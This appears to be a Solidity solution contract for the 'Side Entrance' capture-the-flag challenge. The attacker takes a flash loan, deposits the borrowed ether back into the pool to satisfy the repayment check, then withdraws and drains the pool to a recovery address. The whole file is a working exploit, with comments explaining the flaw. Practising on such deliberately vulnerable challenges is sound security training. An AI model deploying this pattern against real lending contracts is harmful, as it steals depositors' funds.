// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

/*
    Attacker contract for Side Entrance challenge.
    Vulnerability in the SideEntranceLenderPool contract:
    - It allows to get flash loan,
    - However we can interact with the same contract while we have loan.
    - After the loan, it checks if the balance is same or greater.
    - If we deposit what we receive in loan, balance will be same.
    - And the deposited amount will be ours.
    - So instead of repay, we deposit and pass the condition.
    - Then we can withdraw to drain.
*/ 
contract Attacker{

    address payable target;
    address payable recovery;

    constructor (address _target, address _recovery) {
        target = payable(_target);
        recovery = payable(_recovery);
    }

    /*
        - Get loan (whole balance of pool)
        - flashLoan func of target will trigger our execute func.
        - Execute func will deposit received loan.
        - Then we withdraw and transfer to recovery.
     */
    function attack(uint256 amount) public {
        ISideEntranceLenderPool(target).flashLoan(amount);
        ISideEntranceLenderPool(target).withdraw();
        recovery.transfer(address(this).balance);
    }

    function execute() external payable {
        ISideEntranceLenderPool(target).deposit{value: address(this).balance}();
    }

    receive() external payable {}

}